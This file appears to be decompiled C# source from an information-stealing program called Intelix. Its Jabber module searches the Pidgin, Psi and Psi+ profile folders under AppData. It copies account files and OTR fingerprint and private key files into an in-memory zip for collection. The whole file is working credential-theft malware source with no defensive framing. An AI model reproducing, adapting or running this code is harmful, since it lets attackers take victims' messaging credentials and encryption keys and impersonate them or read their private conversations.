using System;
using System.IO;
using System.Threading.Tasks;
using Intelix.Helper.Data;

namespace Intelix.Targets.Messangers
{
	// Token: 0x0200001A RID: 26
	public class Jabber : ITarget
	{
		// Token: 0x0600004D RID: 77 RVA: 0x00003C18 File Offset: 0x00001E18
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string[] source = new string[]
			{
				folderPath + "\\.purple\\",
				folderPath + "\\Psi\\profiles\\default\\",
				folderPath + "\\Psi+\\profiles\\default\\"
			};
			string[] files2 = new string[]
			{
				"accounts.xml",
				"otr.fingerprints",
				"otr.keys",
				"otr.private_key"
			};
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "Jabber";
			Parallel.ForEach<string>(source, delegate(string dir)
			{
				bool flag2 = Directory.Exists(dir);
				if (flag2)
				{
					Parallel.ForEach<string>(files2, delegate(string file2)
					{
						bool flag3 = File.Exists(dir + file2);
						if (flag3)
						{
							string text = "Jabber\\" + file2;
							zip.AddFile(text, File.ReadAllBytes(dir + file2));
							counterApplications.Files.Add(dir + file2 + " => " + text);
						}
					});
				}
			});
			bool flag = counterApplications.Files.Count > 0;
			if (flag)
			{
				counterApplications.Files.Add("Jabber\\");
				counter.Messangers.Add(counterApplications);
			}
		}
	}
}
